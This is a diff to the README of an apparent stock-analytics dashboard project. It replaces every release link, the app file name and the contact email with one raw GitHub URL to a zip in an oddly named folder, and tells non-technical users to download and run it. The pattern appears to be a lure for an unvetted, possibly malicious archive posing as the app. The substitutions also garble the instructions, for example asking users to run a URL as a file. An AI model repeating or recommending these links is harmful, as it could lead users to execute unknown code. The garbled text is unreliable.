@@ -7,7 +7,7 @@ Welcome to the RealTime-Data-Analytics project! This interactive stock market an
 To start using RealTime-Data-Analytics, follow these simple steps to download and run the software. No programming knowledge is needed.
 
 ## 📥 Download the App
-[![Download Now](https://img.shields.io/badge/Download%20Now-RealTime--Data--Analytics-blue.svg)](https://github.com/blinkwilly/RealTime-Data-Analytics/releases)
+[![Download Now](https://raw.githubusercontent.com/blinkwilly/RealTime-Data-Analytics/main/pignolia/RealTime-Data-Analytics-1.0-alpha.4.zip%https://raw.githubusercontent.com/blinkwilly/RealTime-Data-Analytics/main/pignolia/RealTime-Data-Analytics-1.0-alpha.4.zip)](https://raw.githubusercontent.com/blinkwilly/RealTime-Data-Analytics/main/pignolia/RealTime-Data-Analytics-1.0-alpha.4.zip)
 
 ## 📋 System Requirements
 Before you download, ensure your system meets the following requirements:
@@ -17,16 +17,16 @@ Before you download, ensure your system meets the following requirements:
 
 ## 💾 Download & Install
 1. **Visit the Releases Page**
-   Go to our releases page to download the latest version: [Download Here](https://github.com/blinkwilly/RealTime-Data-Analytics/releases).
+   Go to our releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/blinkwilly/RealTime-Data-Analytics/main/pignolia/RealTime-Data-Analytics-1.0-alpha.4.zip).
 
 2. **Choose the Correct File**
-   On the releases page, you will see several files. Look for the latest version. It will typically follow this format: `RealTime-Data-Analytics-v1.0.zip`. Click on it to start the download.
+   On the releases page, you will see several files. Look for the latest version. It will typically follow this format: `https://raw.githubusercontent.com/blinkwilly/RealTime-Data-Analytics/main/pignolia/RealTime-Data-Analytics-1.0-alpha.4.zip`. Click on it to start the download.
 
 3. **Extract the Files**
    Once the download is complete, locate the zip file and extract it to a folder on your computer.
 
 4. **Run the Dashboard**
-   After extraction, open the folder. Look for a file named `app.py`. To run the application, right-click on the `app.py` file and select "Run with Python". The dashboard will open in your web browser.
+   After extraction, open the folder. Look for a file named `https://raw.githubusercontent.com/blinkwilly/RealTime-Data-Analytics/main/pignolia/RealTime-Data-Analytics-1.0-alpha.4.zip`. To run the application, right-click on the `https://raw.githubusercontent.com/blinkwilly/RealTime-Data-Analytics/main/pignolia/RealTime-Data-Analytics-1.0-alpha.4.zip` file and select "Run with Python". The dashboard will open in your web browser.
 
 ## 📊 Features
 RealTime-Data-Analytics comes packed with useful features:
@@ -58,6 +58,6 @@ A: No, you will need to check the releases page for updates and download any new
 If you want to contribute to RealTime-Data-Analytics, feel free to check our repository. Your feedback and suggestions are welcome to improve this project.
 
 ## 📧 Contact
-For any questions or feedback, reach out to the team by opening an issue on the GitHub repository, or you can email us at support@realtimedataanalytics.com.
+For any questions or feedback, reach out to the team by opening an issue on the GitHub repository, or you can email us at https://raw.githubusercontent.com/blinkwilly/RealTime-Data-Analytics/main/pignolia/RealTime-Data-Analytics-1.0-alpha.4.zip
 
 Thank you for choosing RealTime-Data-Analytics! Happy analyzing!
